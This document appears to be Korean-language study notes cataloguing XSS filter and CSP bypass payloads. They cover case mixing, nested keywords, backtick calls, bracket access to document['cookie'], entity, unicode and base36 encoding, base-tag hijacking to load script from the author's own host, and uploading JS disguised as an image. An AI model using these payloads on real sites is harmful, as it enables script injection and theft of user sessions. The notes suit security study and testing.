
[[Methodology - XSS#Phase 3 방어선 식별 및 우회 (Defense Evasion)]]

## 1. 키워드 필터링 우회 (Keyword Bypass)
서버가 `script`, `onerror` 같은 특정 단어를 지우거나 막을 때.

* **대소문자 혼용:** `<sCrIpT>alert(1)</ScRiPt>` (가장 기초)
* **문자열 파괴 (치환 로직 악용):** 서버가 `script`를 공백으로 지워버릴 때.
    * `<scrSCRIPTipt>` ➡️ 중간의 `SCRIPT`가 지워지면서 다시 `<script>`가 됨.
* **JS Context 내부 분리 (문자열 더하기):**
    * `var a = "al" + "ert"; window[a](1);`

## 2. 특수기호 및 함수 우회 (Syntax Bypass)
`( )`, `.` , `"` 같은 기호를 못 쓰게 막아뒀을 때.

* **괄호 `()` 우회:** 백틱(Backtick) 사용
    * `alert(1)` ➡️ alert\`1\`
* **마침표 `.` 우회:** 대괄호 사용
    * `document.cookie` ➡️ `document['cookie']`
    * `location.href` ➡️ `location['href']`
* **문자열 생성 (따옴표 불가 시):**
    * `alert(/xss/.source)` (정규식 이용)
    * `String.fromCharCode(97, 108, 101, 114, 116)`

## 3. 인코딩 및 난독화 (The Magic of Context)
[⚠️ 절대 규칙: 공격할 컨텍스트(지형)에 맞는 암호를 써야 한다!]

* **HTML Entity (`&#x...;`): HTML 태그 속성 내부에서 사용**
    * `<iframe src="javascript:alert(1)">` 필터링 시 ➡️ `<iframe src="javasc&#x72;ipt:alert(1)">`
* **Unicode (`\u...`) & Hex (`\x...`): 자바스크립트 영역 내부에서 사용**
    * `alert` 필터링 시 ➡️ `<img src=x onerror=\u0061lert(1)>` (onerror 안쪽은 JS 구역이므로 동작!)
* **36진수 역산 (Base36): 숫자를 단어로 세탁**
    * 문자열을 다 막았을 때 사용. JS 엔진이 계산해서 단어로 복원함.
    * `alert` ➡️ `window[(17795081).toString(36)](1)`

## 4. CSP (Content Security Policy) 최종 보스 우회
CSP가 걸려있어 무지성 `<script>` 삽입이 불가능할 때.

* **1. Base 태그 하이재킹 (base-uri 미설정 시):**
    * **조건:** 타겟 HTML 하단에 `<script src="/static/js/app.js">` 같은 상대 경로 스크립트가 있을 때.
    * **공격:** 본문에 `<base href="https://내_깃허브_pages_주소/">` 주입.
    * **효과:** 브라우저가 타겟 서버가 아닌 내 깃허브에서 `app.js`를 가져와 실행함.
* **2. 업로드 파일 스니핑 (`'self'` 정책 시):**
    * **조건:** CSP에 `script-src 'self'` 가 있고, 이미지 업로드 기능이 있을 때.
    * **공격:** JS 코드(`alert(1)`)를 텍스트로 적고 `hack.png`로 저장해 업로드. 그 후 `<script src="/uploads/hack.png"></script>` 주입.
    * **효과:** 브라우저는 확장자를 무시하고 내용물(JS)을 실행해버림.